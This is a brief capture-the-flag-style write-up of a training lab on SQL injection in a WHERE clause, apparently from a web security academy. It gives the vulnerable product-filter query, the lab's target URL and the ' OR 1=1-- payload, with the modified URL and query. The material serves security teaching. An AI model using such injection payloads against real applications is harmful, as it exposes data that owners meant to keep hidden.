# Retrieving hidden data

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

Target URL:

```
https://ac6d1ff11f66bccd816d5ebd00c40052.web-security-academy.net/filter?category=Gifts
```

Solution:

```SQL
' OR 1=1--
```

Modified URL:

```
https://ac6d1ff11f66bccd816d5ebd00c40052.web-security-academy.net/filter?category=Gifts'+OR+1=1--
```

Modified SQL query:

```SQL
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```